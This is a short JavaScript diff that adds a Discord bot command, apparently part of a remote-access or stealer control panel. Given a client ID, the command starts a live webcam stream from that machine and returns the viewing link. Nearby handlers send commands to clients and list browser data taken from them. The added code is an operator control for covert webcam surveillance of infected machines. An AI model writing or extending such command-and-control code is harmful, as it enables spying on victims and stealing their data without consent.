@@ -94,6 +94,25 @@ export const handleSendCommand = async (interaction) => {
     }
 };
 
+export const handleLivestreamCommand = async (interaction) => {
+    const clientId = interaction.options.getString('client_id');
+    await interaction.deferReply({ ephemeral: true });
+
+    const url = `${API_BASE_URL}/webcam/link/${clientId}`;
+    const url_webcam = `${API_BASE_URL}/webcam/${clientId}`;
+    try {
+        await executeRequestWithTokenRefresh(url, { method: 'GET' });
+        await interaction.editReply(`Diffusion en direct de la webcam du client ${clientId} démarrée : ${url_webcam}`);
+    } catch (error) {
+        if (error.response.data.message.includes("hors ligne")) {
+            await interaction.editReply("Le client est hors ligne.");
+        } else {
+            console.error("Erreur lors du démarrage de la diffusion en direct", error);
+            await interaction.editReply("Erreur lors du démarrage de la diffusion en direct.");
+        }
+    }
+}
+
 export const handleListDataCommand = async (interaction) => {
     const type = interaction.options.getString('type');
     const browser = interaction.options.getString('browser') || null;
